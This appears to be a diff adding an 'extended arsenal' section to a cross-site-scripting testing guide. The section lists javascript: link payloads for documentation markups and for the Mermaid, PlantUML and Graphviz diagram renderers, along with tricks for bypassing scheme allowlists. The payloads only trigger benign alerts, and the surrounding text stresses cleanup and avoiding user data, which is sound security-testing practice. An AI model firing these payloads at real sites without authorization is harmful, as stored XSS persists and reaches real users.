@@ -130,3 +130,37 @@ though you never see the render.
 - `document.domain` / `document.cookie.length` (a number) only — never the cookie value or real user data.
 - Keep a short greppable alnum marker alongside to locate WHERE it rendered without execution.
 - Record every injected artifact in cleanup.md for removal (stored payloads persist for real users).
+
+---
+
+## Extended arsenal — diagram & documentation renderers (beyond Markdown)
+Doc / wiki / ticket surfaces often run MORE than Markdown — each doc markup has its own link sink, and
+diagram renderers parse a mini-language that can emit links / HTML / inline SVG. Fingerprint the
+renderer (+ version), then pick the sink. Benign marker only.
+### Documentation-markup link sinks (`javascript:` / `data:` in a URL position)
+```
+RDoc:               {text}[javascript:alert(document.domain)]
+Textile:            "text":javascript:alert(document.domain)
+BBCode:             [url=javascript:alert(document.domain)]text[/url]
+reStructuredText:   `text <javascript:alert(document.domain)>`_
+AsciiDoc:           link:javascript:alert(document.domain)[text]
+MediaWiki/wikitext: [javascript:alert(document.domain) text]        # external-link syntax
+```
+Many renderers allowlist schemes on OUTPUT — defeat a naive check with `data:text/html`, an
+entity/space-smuggled scheme (`java&#09;script:`), or `javascript://%0aalert(document.domain)`
+(see scheme-smuggling above).
+### Diagram renderers (server- or client-side; render user text into SVG/HTML)
+```
+# Mermaid (needs securityLevel != 'strict'; label-HTML + click/link are version-dependent):
+click NodeId "javascript:alert(document.domain)"
+A["<img src=x onerror=alert(document.domain)>"]
+# PlantUML / Kroki — link on a node:
+@startuml
+url of A is [[javascript:alert(document.domain)]]
+@enduml
+# Graphviz/DOT (e.g. via Kroki) — node URL attribute:
+digraph{ a[URL="javascript:alert(document.domain)"] }
+```
+A diagram endpoint that returns **SVG served same-origin inline** is an SVG-upload XSS surface — treat
+it as such (cookie-scope impact). Pin the renderer version (bundle string / `libraries.jsonl`):
+label/HTML support and the default `securityLevel` differ across versions.
